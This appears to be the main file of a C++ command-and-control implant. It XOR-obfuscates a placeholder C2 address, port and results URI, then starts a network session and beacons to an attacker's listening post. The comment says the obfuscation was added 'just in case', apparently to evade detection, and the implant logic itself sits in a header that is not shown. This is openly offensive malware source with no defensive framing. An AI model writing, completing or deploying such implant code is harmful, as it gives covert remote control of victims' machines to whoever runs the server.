#include <stdio.h>
#include "implant.h"
#include <boost/system/system_error.hpp>
#include "xor_string.hpp"

int main()
{
    //Specify listening post endpoint configuration
    const auto host = XOR_STR("ENTER C2 IP ADDR"); // added basic xor obfuscation, just in case
    const auto port = XOR_STR("5000");
    const auto uri = XOR_STR("/results");

    NetSession implant{ host, port, uri };
    implant.start();
    try {
        implant.beacon();
    }
    catch (const boost::system::system_error& se) {
        printf("\nSystem error: %s\n", se.what());
    }
}